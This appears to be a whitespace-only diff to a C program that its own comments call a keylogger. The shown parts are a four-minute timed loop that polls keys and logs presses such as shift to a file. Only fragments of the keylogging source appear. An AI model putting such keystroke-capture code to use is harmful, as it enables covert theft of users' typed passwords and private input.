@@ -29,7 +29,7 @@ int main(void) {
 
 	//begin keylogger
 	time_t t = time(NULL) + 240; //runs 4 mins
-   do{
+	do{
 		if (time(NULL) >= t) { break; }
 		Sleep(15); //cpu usage
 		//loop through selected keys & see if pressed down
@@ -50,7 +50,7 @@ int main(void) {
 				fprintf(fPtr, "*shift*");
 			}
 		}
-   } while( time(NULL) < t );
+	} while( time(NULL) < t );
 	fclose(fPtr);
 }
 
